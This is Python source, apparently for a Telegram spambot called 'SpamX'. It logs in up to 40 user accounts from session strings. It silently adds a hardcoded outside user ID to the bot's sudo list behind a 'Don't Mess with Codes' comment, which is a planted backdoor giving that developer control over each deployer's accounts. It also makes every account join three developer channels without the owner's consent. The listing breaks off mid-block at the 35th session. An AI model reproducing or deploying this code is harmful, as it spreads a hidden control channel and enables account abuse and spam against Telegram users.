import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

spamxversion = "v2.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 5072650671 not in SUDO_USERS:
    SUDO_USERS.append(5072650671)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def SpamX():
    global omfo
    global omfo2
    global omfo3
    global omfo5
    global omfo4
    global omfo6
    global omfo7
    global omfo8
    global omfo9
    global omfo10
    global omfo11
    global omfo12
    global omfo13
    global omfo14
    global omfo15
    global omfo16
    global omfo17
    global omfo18
    global omfo19
    global omfo20
    global omfo21
    global omfo22
    global omfo23
    global omfo25
    global omfo24
    global omfo26
    global omfo27
    global omfo28
    global omfo29
    global omfo30
    global omfo31
    global omfo32
    global omfo33
    global omfo34
    global omfo35
    global omfo36
    global omfo37
    global omfo38
    global omfo39
    global omfo40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        omfo = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 1")
            await omfo.start()
            botme = await omfo.get_me()
            await omfo(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            omfo = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "SpamXspam"
        omfo = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        omfo2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 2")
            await omfo2.start()
            await omfo2(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo2(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo2(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "SpamXspam"
        omfo2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        omfo3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 3")
            await  omfo3.start()
            await omfo3(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo3(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo3(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "SpamXspam"
        omfo3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        omfo4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 4")
            await omfo4.start()
            await omfo4(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo4(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo4(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "SpamXspam"
        omfo4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        omfo5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 5")
            await omfo5.start()
            await omfo5(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo5(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo5(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "SpamXspam"
        omfo5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        omfo6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 6")
            await omfo6.start()
            await omfo6(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo6(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo6(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "SpamXspam"
        omfo6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        omfo7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 7")
            await omfo7.start()
            await omfo7(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo7(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo7(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "SpamXspam"
        omfo7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        omfo8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 8")
            await omfo8.start()
            await omfo8(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo8(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo8(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "SpamXspam"
        omfo8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        omfo9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 9")
            await omfo9.start()
            await omfo9(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo9(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo9(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "SpamXspam"
        omfo9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        omfo10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 10")
            await omfo10.start()
            await omfo10(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo10(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo10(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "SpamXspam"
        omfo10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        omfo11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 11")
            await omfo11.start()
            await omfo11(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo11(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo11(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "SpamXspam"
        omfo11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        omfo12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 12")
            await omfo12.start()
            await omfo12(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo12(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo12(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "SpamXspam"
        omfo12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        omfo13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 13")
            await omfo13.start()
            await omfo13(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo13(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo13(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "SpamXspam"
        omfo13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        omfo14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 14")
            await omfo14.start()
            await omfo14(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo14(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo14(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "SpamXspam"
        omfo14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        omfo15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 15")
            await omfo15.start()
            await omfo15(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo15(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo15(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "SpamXspam"
        omfo15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        omfo16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 16")
            await omfo16.start()
            botme = await omfo16.get_me()
            await omfo16(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo16(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo16(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "SpamXspam"
        omfo16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        omfo17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 17")
            await omfo17.start()
            botme = await omfo17.get_me()
            await omfo17(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo17(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo17(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "SpamXspam"
        omfo17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        omfo18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 18")
            await omfo18.start()
            botme = await omfo18.get_me()
            await omfo18(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo18(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo18(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "SpamXspam"
        omfo18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        omfo19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 19")
            await omfo19.start()
            botme = await omfo19.get_me()
            await omfo19(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo19(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo19(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "SpamXspam"
        omfo19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        omfo20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 20")
            await omfo20.start()
            botme = await omfo20.get_me()
            await omfo20(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo20(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo20(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "SpamXspam"
        omfo20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        omfo21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 21")
            await omfo21.start()
            botme = await omfo21.get_me()
            await omfo21(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo21(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo21(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "SpamXspam"
        omfo21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        omfo22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 32")
            await omfo22.start()
            await omfo22(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo22(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo22(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "SpamXspam"
        omfo22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        omfo23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 23")
            await  omfo23.start()
            await omfo23(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo23(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo23(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "SpamXspam"
        omfo23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        omfo24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 24")
            await omfo24.start()
            await omfo24(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo24(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo24(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "SpamXspam"
        omfo24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        omfo25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 35")
            await omfo25.start()
            await omfo25(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo25(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo25(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "SpamXspam"
        omfo25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        omfo26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 26")
            await omfo26.start()
            await omfo26(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo26(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo26(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "SpamXspam"
        omfo26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        omfo27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 27")
            await omfo27.start()
            await omfo27(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo27(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo27(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "SpamXspam"
        omfo27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        omfo28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 18")
            await omfo28.start()
            await omfo28(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo28(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo28(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "SpamXspam"
        omfo28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        omfo29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 29")
            await omfo29.start()
            await omfo29(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo29(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo29(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "SpamXspam"
        omfo29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        omfo30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 30")
            await omfo30.start()
            await omfo30(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo30(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo30(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "SpamXspam"
        omfo30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        omfo31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 31")
            await omfo31.start()
            await omfo31(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo31(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo31(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = "SpamXspam"
        omfo31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        omfo32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 32")
            await omfo32.start()
            await omfo32(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo32(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo32(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = "SpamXspam"
        omfo32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        omfo33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 33")
            await omfo33.start()
            await omfo33(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo33(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo33(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = "SpamXspam"
        omfo33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        omfo34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 34")
            await omfo34.start()
            await omfo34(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo34(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo34(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = "SpamXspam"
        omfo34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await omfo34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        omfo35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Yo Starting Up Your Client 35")
            await omfo35.start()
            await omfo35(functions.channels.JoinChannelRequest(channel="@SILENT_DEVS"))
            await omfo35(functions.channels.JoinChannelRequest(channel="@DEVX_OWNER"))
            await omfo35(functions.channels.JoinChannelRequest(channel="@GODZILLA_SPAMBOT"))
            botme = await omfo35.get_me()
            botid = telethon.utils.get_peer_id(botme)
